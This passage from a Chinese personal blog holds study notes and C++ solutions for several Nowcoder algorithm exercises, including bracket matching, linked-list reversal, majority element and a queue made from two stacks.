class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">char</span> c = stack1.top();</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">'['</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(stack1.<span class="built_in">size</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">                    bol = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                stack1.pop();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                bol = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">'&#125;'</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stack1.<span class="built_in">size</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">                bol = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">char</span> c = stack1.top();</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">'&#123;'</span>)&#123;</span><br><span class="line">                stack1.pop();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                bol = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">')'</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stack1.<span class="built_in">size</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">                bol = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">char</span> c = stack1.top();</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">'('</span>)&#123;</span><br><span class="line">                stack1.pop();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                bol = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stack1.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bol;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="NC55-最长公共前缀"><a href="#NC55-最长公共前缀" class="headerlink" title="NC55 最长公共前缀"></a>NC55 最长公共前缀</h2><blockquote>
<p>五种方法，，，</p>
</blockquote>
<h2 id="NC57-反转数字"><a href="#NC57-反转数字" class="headerlink" title="NC57 反转数字"></a>NC57 反转数字</h2><blockquote>
<p>看了答案，感觉很简单，tql。</p>
<p>就直接把结果加到res上，都不用考虑负数和溢出。。。</p>
<p>负数其实无所谓，但是溢出的话，可以同不会溢出的long和溢出的int比较大小是否相同判断是否溢出了。</p>
</blockquote>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param x int整型 </span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> res=<span class="number">0</span>;<span class="comment">//由于给定了长度，故long的话，不会溢出。</span></span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">0</span>)&#123;</span><br><span class="line">            res = res*<span class="number">10</span>+x%<span class="number">10</span>;</span><br><span class="line">            x/=<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>)res == res?(<span class="keyword">int</span>)res:<span class="number">0</span>;<span class="comment">//根据long和int是否相等，就可以知道是否溢出了。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="NC65-斐波那契数列"><a href="#NC65-斐波那契数列" class="headerlink" title="NC65 斐波那契数列"></a>NC65 斐波那契数列</h2><blockquote>
<p>简单题，，，，感觉自己写的挺好的，，，</p>
</blockquote>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">Fibonacci</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a[<span class="number">40</span>];</span><br><span class="line">        a[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        a[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;<span class="number">40</span>;i++)&#123;</span><br><span class="line">            a[i] = a[i<span class="number">-1</span>] + a[i<span class="number">-2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a[n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="NC66-两个链表的第一个公共结点"><a href="#NC66-两个链表的第一个公共结点" class="headerlink" title="NC66 两个链表的第一个公共结点"></a>NC66 两个链表的第一个公共结点</h2><blockquote>
<ol>
<li><p>说的是公共结点而不是相同元素的结点，所以如图所示：</p>
<p><img src="/2021/04/18/%E7%89%9B%E5%AE%A2%E7%BD%91-%E7%AE%97%E6%B3%95%E7%AF%87/image-20210414211616825.png" alt="image-20210414211616825"></p>
<p>2.a的长度不一定等于b的长度，为了让两个指针同步走，又因为a+b=b+a</p>
<p>故前面增加另一个链表，如下图所示</p>
<p><img src="/2021/04/18/%E7%89%9B%E5%AE%A2%E7%BD%91-%E7%AE%97%E6%B3%95%E7%AF%87/image-20210414211726549.png" alt="image-20210414211726549"></p>
</li>
</ol>
</blockquote>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct ListNode &#123;</span></span><br><span class="line"><span class="comment">	int val;</span></span><br><span class="line"><span class="comment">	struct ListNode *next;</span></span><br><span class="line"><span class="comment">	ListNode(int x) :</span></span><br><span class="line"><span class="comment">			val(x), next(NULL) &#123;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">&#125;;*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">FindFirstCommonNode</span><span class="params">( ListNode* pHead1, ListNode* pHead2)</span> </span>&#123;</span><br><span class="line">        ListNode* ta=pHead1;</span><br><span class="line">        ListNode* tb=pHead2;</span><br><span class="line">        <span class="keyword">while</span>(ta!=tb)&#123;<span class="comment">//公共结点</span></span><br><span class="line">            ta=ta?ta-&gt;next:pHead2;<span class="comment">//pHead1+pHead2</span></span><br><span class="line">            tb=tb?tb-&gt;next:pHead1;<span class="comment">//pHead1+pHead1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ta;<span class="comment">//直接返回即可，一定有公共结点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="NC68-跳台阶"><a href="#NC68-跳台阶" class="headerlink" title="NC68 跳台阶"></a>NC68 跳台阶</h2><blockquote>
<p>有递归和循环（动态规划）两种解法，我写的是递归。</p>
<p>递归式：<img src="/2021/04/18/%E7%89%9B%E5%AE%A2%E7%BD%91-%E7%AE%97%E6%B3%95%E7%AF%87/image-20210414170335614.png" alt="image-20210414170335614"></p>
</blockquote>
<h3 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3><blockquote>
<p>将过程的情况记录在dp数组中。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">jumpFloor</span><span class="params">(<span class="keyword">int</span> number)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> dp[number+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=number;i++)&#123;</span><br><span class="line">            dp[i]=dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[number];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="my-exp（递归）"><a href="#my-exp（递归）" class="headerlink" title="my exp（递归）"></a>my exp（递归）</h3><blockquote>
<p>只要指定结束条件，然后公式，，，就行</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">jumpFloor</span><span class="params">(<span class="keyword">int</span> number)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(number==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(number==<span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> jumpFloor(number<span class="number">-1</span>)+jumpFloor(number<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="NC73-数组中出现次数超过一半的数字"><a href="#NC73-数组中出现次数超过一半的数字" class="headerlink" title="NC73 数组中出现次数超过一半的数字"></a>NC73 数组中出现次数超过一半的数字</h2><blockquote>
<p>emmm，感觉这题似曾相识，一开始直接排序取中值，然后不对，是因为这里硬性要求要个数大于一般，就模拟来做，做出来了。</p>
<p>题解就比较强了，给了三种方法，分别是哈希法、排序法、候选法。思路其实本质一样，只是实现的方法略有不同。</p>
</blockquote>
<h3 id="哈希法"><a href="#哈希法" class="headerlink" title="哈希法"></a>哈希法</h3><blockquote>
<p>使用map，他的键是数，值是出现的个数，先放进去，找到大于一半的</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">MoreThanHalfNum_Solution</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; <span class="built_in">map</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span> k:numbers) ++<span class="built_in">map</span>[k];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span> k:numbers)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">map</span>[k]&gt;numbers.<span class="built_in">size</span>()/<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> k;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="排序法"><a href="#排序法" class="headerlink" title="排序法"></a>排序法</h3><blockquote>
<p>排序好的中值一定是我们要找的数，然后判断他的长度即可。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">MoreThanHalfNum_Solution</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers)</span> </span>&#123;</span><br><span class="line">        sort(numbers.<span class="built_in">begin</span>(),numbers.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">int</span> cond = numbers[numbers.<span class="built_in">size</span>()/<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span> k:numbers)&#123;</span><br><span class="line">            <span class="keyword">if</span>(k == cond)&#123;</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cnt &gt; numbers.<span class="built_in">size</span>()/<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> cond;</span><br><span class="line">        &#125;<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="候选法"><a href="#候选法" class="headerlink" title="候选法"></a>候选法</h3><blockquote>
<p>很有意思的想法，因为选取的数，要大于一半。</p>
<p>所以让两两不同的消除，相同的保留，这样，最后能留下来的话就是答案，否则就没有。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">MoreThanHalfNum_Solution</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cond = <span class="number">-1</span>;<span class="comment">//候选人，即选出来的值</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numbers.<span class="built_in">size</span>();i++)&#123;<span class="comment">//循环的是下标</span></span><br><span class="line">            <span class="keyword">if</span>(cnt == <span class="number">0</span>)&#123;<span class="comment">//没有候选人</span></span><br><span class="line">                cond=numbers[i];<span class="comment">//直接选取当前的作为候选人</span></span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(cond == numbers[i])<span class="comment">//如果还是候选人</span></span><br><span class="line">                    cnt++;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    cnt--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span> k:numbers)&#123;<span class="comment">//循环的是数组里面的值，即候选人</span></span><br><span class="line">            <span class="keyword">if</span>(k == cond)</span><br><span class="line">                cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cnt &gt; numbers.<span class="built_in">size</span>()/<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> cond;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="my-exp-1"><a href="#my-exp-1" class="headerlink" title="my exp"></a>my exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int MoreThanHalfNum_Solution(vector&lt;int&gt; numbers) &#123;</span><br><span class="line">        int arr[10]&#x3D;&#123;0,0,0,0,0,0,0,0,0,0&#125;;</span><br><span class="line">        for(int i&#x3D;0;i&lt;numbers.size();i++)&#123;</span><br><span class="line">            arr[numbers[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        for(int i&#x3D;0;i&lt;10;i++)&#123;</span><br><span class="line">            if(arr[i]&gt;numbers.size()&#x2F;2)&#123;</span><br><span class="line">                return i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="NC-76-用两个栈实现队列"><a href="#NC-76-用两个栈实现队列" class="headerlink" title="NC 76 用两个栈实现队列"></a>NC 76 用两个栈实现队列</h2><blockquote>
<p>简单，，，图示如下：</p>
<p><img src="/2021/04/18/%E7%89%9B%E5%AE%A2%E7%BD%91-%E7%AE%97%E6%B3%95%E7%AF%87/image-20210412140342164.png" alt="image-20210412140342164"></p>
</blockquote>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>思路：</p>
<ol>
<li>push操作，还是正常的，stack1.push即可</li>
<li>pop操作，首先要讲栈1的数据放入栈2中，然后从栈2中pop出来的数据，就可以了。</li>
</ol>
<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> node)</span> </span>&#123;</span><br><span class="line">        stack1.push(node);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stack2.empty())&#123;</span><br><span class="line">            <span class="keyword">while</span>(!stack1.empty())&#123;</span><br><span class="line">                stack2.push(stack1.top());</span><br><span class="line">                stack1.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans = stack2.top();</span><br><span class="line">        stack2.pop();</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; stack1;</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; stack2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：不能直接讲pop后的值拿来赋值，我也不知道为什么，但事实上就是不好使，先top赋值，然后pop掉数。</p>
</blockquote>
<h2 id="NC78-反转链表"><a href="#NC78-反转链表" class="headerlink" title="NC78 反转链表"></a>NC78 反转链表</h2><blockquote>
<p><del>玄学，，，为什么我写的一直报错，，，，搞不懂啊，，，555，，，TATATAT</del></p>
</blockquote>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>反转链表，，，思路就是把每个节点存入一个向量vector中，他的类型是ListNode*的，然后就好了。。。</p>
<p>这里比较奇怪的一点是，要先给ans赋值v[v.size()-1]，否则就会出现段错误，，，，搞不懂</p>
<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-25.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">next</span>;</span></span><br><span class="line">	ListNode(<span class="keyword">int</span> x) :</span><br><span class="line">			val(x), next(<span class="literal">NULL</span>) &#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">ReverseList</span><span class="params">(ListNode* pHead)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!pHead)  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;ListNode*&gt; v;</span><br><span class="line">        <span class="keyword">while</span>(pHead!= <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            v.push_back(pHead);</span><br><span class="line">            pHead = pHead-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* res = v[v.<span class="built_in">size</span>()<span class="number">-1</span>];</span><br><span class="line">        ListNode* current = res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = v.<span class="built_in">size</span>()<span class="number">-2</span>; i &gt;= <span class="number">0</span> ; --i) &#123;</span><br><span class="line">            current-&gt;next = v[i];</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        current-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">ListNode <span class="title">l1</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="function">ListNode <span class="title">l2</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">    <span class="function">ListNode <span class="title">l3</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line">    l1.next = &amp;l2;</span><br><span class="line">    l2.next = &amp;l3;</span><br><span class="line"></span><br><span class="line">    Solution s;</span><br><span class="line">    ListNode* ans = s.ReverseList(&amp;l1);</span><br><span class="line">    <span class="keyword">while</span> (ans!= <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans-&gt;val&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        ans = ans-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="NC82-滑动窗口的最大值"><a href="#NC82-滑动窗口的最大值" class="headerlink" title="NC82 滑动窗口的最大值"></a>NC82 滑动窗口的最大值</h2><blockquote>
<p>主要知道一下一点，就能比较方便的做出来</p>
<ul>
<li>滑动窗口的个数：<code>int sz = num.size()-size+1;</code>【简单的数学知识】</li>
</ul>
<p>其他的就是正常的编程即可。</p>
</blockquote>
<h3 id="按给定大小对数组初始化"><a href="#按给定大小对数组初始化" class="headerlink" title="按给定大小对数组初始化"></a>按给定大小对数组初始化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v</span> <span class="params">(sz,<span class="number">0</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可以看到其实vector使用的相对来说还是比较多的。</p>
</blockquote>
<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><blockquote>
<p>虽然很简单，又很平常的语句，但是不加的话，一旦数据量比较大，那么运行很可能超时间，故一定要养成写的习惯。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">size</span> &gt; num.<span class="built_in">size</span>() || <span class="built_in">size</span> ==<span class="number">0</span> ) <span class="keyword">return</span> &#123;&#125;;</span><br></pre></td></tr></table></figure>

